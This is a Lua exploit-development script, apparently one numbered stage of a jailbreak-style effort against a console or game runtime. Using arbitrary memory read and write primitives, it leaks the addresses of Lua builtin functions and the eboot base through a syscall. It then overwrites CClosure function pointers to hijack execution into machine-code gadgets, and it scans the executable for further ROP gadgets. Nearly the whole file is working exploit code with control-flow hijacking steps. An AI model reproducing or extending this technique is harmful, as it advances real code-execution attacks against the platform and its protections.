-- CRASH_CLASS: LOW
-- PROBE 56e: Clean gadget execution via CClosure redirect
--
-- Context: 56d proved eboot gadgets execute via CClosure +0x20 redirect.
-- "ret" gadget ran but eax was garbage → Lua read garbage returns.
-- "pop rax; ret" crashed (consumed return address).
-- "xor eax,eax; ret" at eboot+0x471 should cleanly return 0 → nil.
--
-- This probe focuses on SAFE gadgets only:
--   [A] xor eax,eax; ret (eboot+0x471) — returns 0 results = nil
--   [B] Multiple calls to xor eax,eax;ret to prove repeatability
--   [C] Redirect rawget to xor eax,eax;ret (second function test)
--   [D] Redirect select to xor eax,eax;ret (third function test)
--   [E] Timing: 100 redirect+call+restore cycles
--   [F] mov eax,1; ret scan — if found, returns exactly 1 result

print("=== PROBE 56e: CLEAN GADGET EXECUTION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo))
    end
    return nil
end

local rawequal_addr = parse_func_addr(rawequal)
local rawget_addr = parse_func_addr(rawget)
local select_addr = parse_func_addr(select)
local eboot_base = get_eboot_base()

print("[INFO] Addresses:")
print("  rawequal:   " .. hexval(rawequal_addr))
print("  rawget:     " .. hexval(rawget_addr))
print("  select:     " .. hexval(select_addr))
print("  eboot base: " .. hexval(eboot_base))

if not rawequal_addr or not eboot_base then
    print("ABORT: missing addresses")
    return
end

local eboot_hi, eboot_lo = get_hi_lo(eboot_base)

local function eboot_gadget(offset)
    local lo = eboot_lo + offset
    local hi = eboot_hi
    if lo >= 0x100000000 then
        hi = hi + 1
        lo = lo - 0x100000000
    end
    return lo, hi
end

-- Save originals
local rawequal_20_lo = safe_rd(rawequal_addr + 0x20)
local rawequal_20_hi = safe_rd(rawequal_addr + 0x24)
local rawget_20_lo = safe_rd(rawget_addr + 0x20)
local rawget_20_hi = safe_rd(rawget_addr + 0x24)
local select_20_lo = safe_rd(select_addr + 0x20)
local select_20_hi = safe_rd(select_addr + 0x24)

-- xor eax,eax; ret = eboot+0x471 (confirmed in 56d)
local xor_ret_lo, xor_ret_hi = eboot_gadget(0x471)
print(string.format("  xor eax,eax;ret: 0x%08X_%08X", xor_ret_hi, xor_ret_lo))

-- Verify the gadget bytes
local xor_addr = uint64(string.format("0x%X%08X", xor_ret_hi, xor_ret_lo))
local xor_bytes = safe_rd(xor_addr)
print(string.format("  gadget bytes: 0x%08X (expect 0x??C3C031)", xor_bytes or 0))
local b0 = (xor_bytes or 0) % 256
local b1 = math.floor((xor_bytes or 0) / 256) % 256
local b2 = math.floor((xor_bytes or 0) / 65536) % 256
if b0 == 0x31 and b1 == 0xC0 and b2 == 0xC3 then
    print("  CONFIRMED: 31 C0 C3 = xor eax,eax; ret")
else
    print(string.format("  WARNING: bytes are %02X %02X %02X, not 31 C0 C3", b0, b1, b2))
end

collectgarbage("stop")

-- ============================================================
-- [A] Redirect rawequal -> xor eax,eax;ret
-- eax=0 means 0 Lua return values. pcall should return true,nil
-- ============================================================
print("")
print("[A] Redirect rawequal -> xor eax,eax;ret")
print("  Baseline rawequal(1,1) = " .. tostring(rawequal(1,1)))
print("  MARKER_A_BEFORE_WRITE")
memory.write_dword(rawequal_addr + 0x20, xor_ret_lo)
memory.write_dword(rawequal_addr + 0x24, xor_ret_hi)
print("  MARKER_A_AFTER_WRITE")
local a_ok, a_r1, a_r2 = pcall(rawequal, 1, 1)
print("  MARKER_A_AFTER_CALL")
print("  pcall ok=" .. tostring(a_ok) .. " r1=" .. tostring(a_r1) .. " r2=" .. tostring(a_r2))
-- Try direct call (no pcall)
local a_direct = rawequal(42, 99)
print("  direct call result: " .. tostring(a_direct))
-- Restore
memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
print("  MARKER_A_RESTORED")
print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))

-- ============================================================
-- [B] Repeatability: 10 redirect+call+restore cycles
-- ============================================================
print("")
print("[B] 10 redirect+call+restore cycles (xor eax,eax;ret)")
local b_results = {}
for i = 1, 10 do
    memory.write_dword(rawequal_addr + 0x20, xor_ret_lo)
    memory.write_dword(rawequal_addr + 0x24, xor_ret_hi)
    local ok, r1 = pcall(rawequal, i, i)
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
    b_results[i] = string.format("ok=%s r1=%s", tostring(ok), tostring(r1))
end
for i = 1, 10 do
    print("  cycle " .. i .. ": " .. b_results[i])
end
print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))

-- ============================================================
-- [C] Redirect rawget -> xor eax,eax;ret
-- ============================================================
print("")
print("[C] Redirect rawget -> xor eax,eax;ret")
print("  Baseline rawget({x=1},'x') = " .. tostring(rawget({x=1}, "x")))
memory.write_dword(rawget_addr + 0x20, xor_ret_lo)
memory.write_dword(rawget_addr + 0x24, xor_ret_hi)
local c_ok, c_r1 = pcall(rawget, {x=1}, "x")
print("  pcall ok=" .. tostring(c_ok) .. " r1=" .. tostring(c_r1))
-- Direct
local c_direct = rawget({x=1}, "x")
print("  direct: " .. tostring(c_direct))
-- Restore
memory.write_dword(rawget_addr + 0x20, rawget_20_lo)
memory.write_dword(rawget_addr + 0x24, rawget_20_hi)
print("  verify rawget({x=1},'x') = " .. tostring(rawget({x=1}, "x")))

-- ============================================================
-- [D] Redirect select -> xor eax,eax;ret
-- ============================================================
print("")
print("[D] Redirect select -> xor eax,eax;ret")
print("  Baseline select(1,'a','b') = " .. tostring(select(1, "a", "b")))
memory.write_dword(select_addr + 0x20, xor_ret_lo)
memory.write_dword(select_addr + 0x24, xor_ret_hi)
local d_ok, d_r1 = pcall(select, 1, "a", "b")
print("  pcall ok=" .. tostring(d_ok) .. " r1=" .. tostring(d_r1))
-- Restore
memory.write_dword(select_addr + 0x20, select_20_lo)
memory.write_dword(select_addr + 0x24, select_20_hi)
print("  verify select(1,'a','b') = " .. tostring(select(1, "a", "b")))

-- ============================================================
-- [E] Timing: 100 full redirect+call+restore cycles
-- ============================================================
print("")
print("[E] Timing: 100 redirect+call+restore cycles")
local t0 = os.clock()
for i = 1, 100 do
    memory.write_dword(rawequal_addr + 0x20, xor_ret_lo)
    memory.write_dword(rawequal_addr + 0x24, xor_ret_hi)
    rawequal(1, 1)
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
end
local t1 = os.clock()
print(string.format("  100 cycles: %.4fs (%.6fs each)", t1 - t0, (t1 - t0) / 100))
print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))

-- ============================================================
-- [F] Scan for mov eax,1; ret (B8 01 00 00 00 C3)
-- Returns exactly 1 Lua result (the top of the Lua stack)
-- ============================================================
print("")
print("[F] Scanning eboot for mov eax,1;ret (B8 01000000 C3)")
local mov1_off = nil
for off = 0, 0x100000 - 8, 4 do
    local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
    local dw1 = safe_rd(addr)
    local dw2 = safe_rd(addr + 4)
    if dw1 and dw2 then
        -- B8 01 00 00 at byte 0 of dw1, 00 C3 at bytes 0-1 of dw2
        local a0 = dw1 % 256
        local a1 = math.floor(dw1 / 256) % 256
        local a2 = math.floor(dw1 / 65536) % 256
        local a3 = math.floor(dw1 / 16777216) % 256
        local b0 = dw2 % 256
        local b1 = math.floor(dw2 / 256) % 256
        -- B8 01 00 00 00 C3 starting at byte 0
        if a0 == 0xB8 and a1 == 0x01 and a2 == 0x00 and a3 == 0x00 and b0 == 0x00 and b1 == 0xC3 then
            mov1_off = off
            break
        end
        -- starting at byte 1
        if a1 == 0xB8 and a2 == 0x01 and a3 == 0x00 and b0 == 0x00 and b1 == 0x00 then
            local b2 = math.floor(dw2 / 65536) % 256
            if b2 == 0xC3 then
                mov1_off = off + 1
                break
            end
        end
        -- starting at byte 2
        if a2 == 0xB8 and a3 == 0x01 and b0 == 0x00 and b1 == 0x00 then
            local b2 = math.floor(dw2 / 65536) % 256
            local b3 = math.floor(dw2 / 16777216) % 256
            if b2 == 0x00 and b3 == 0xC3 then
                mov1_off = off + 2
                break
            end
        end
        -- starting at byte 3
        if a3 == 0xB8 and b0 == 0x01 and b1 == 0x00 then
            local b2 = math.floor(dw2 / 65536) % 256
            local b3 = math.floor(dw2 / 16777216) % 256
            if b2 == 0x00 and b3 == 0x00 then
                -- Need byte 0 of NEXT dword = C3
                local dw3 = safe_rd(addr + 8)
                if dw3 and (dw3 % 256) == 0xC3 then
                    mov1_off = off + 3
                    break
                end
            end
        end
    end
end

if mov1_off then
    print(string.format("  FOUND mov eax,1;ret at eboot+0x%X", mov1_off))
    local mov1_lo, mov1_hi = eboot_gadget(mov1_off)
    -- Test it: should return 1 result (whatever is on top of Lua stack)
    print("  Testing redirect...")
    memory.write_dword(rawequal_addr + 0x20, mov1_lo)
    memory.write_dword(rawequal_addr + 0x24, mov1_hi)
    local f_ok, f_r1, f_r2 = pcall(rawequal, 42, 99)
    print("  pcall ok=" .. tostring(f_ok) .. " r1=" .. tostring(f_r1) .. " r2=" .. tostring(f_r2))
    print("  (eax=1 means Lua reads 1 return value from stack top)")
    -- Restore
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
    print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))
else
    print("  NOT FOUND in first 1MB")
end

collectgarbage("restart")

print("")
print("=== PROBE 56e COMPLETE ===")
